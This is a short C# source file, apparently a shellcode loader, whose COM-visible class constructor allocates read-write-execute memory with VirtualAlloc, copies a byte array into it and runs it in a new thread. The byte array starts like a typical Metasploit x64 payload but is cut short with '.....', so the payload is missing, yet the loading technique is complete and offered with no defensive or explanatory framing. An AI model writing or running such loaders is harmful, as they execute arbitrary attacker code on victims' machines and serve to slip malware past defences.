using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	[DllImport("kernel32.dll")]
	static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

	public TestClass()
	{
		byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,.....};

		int size = buf.Length;

		IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
		Marshal.Copy(buf, 0, addr, size);
		IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
		WaitForSingleObject(hThread, 0xFFFFFFFF);
	}

}
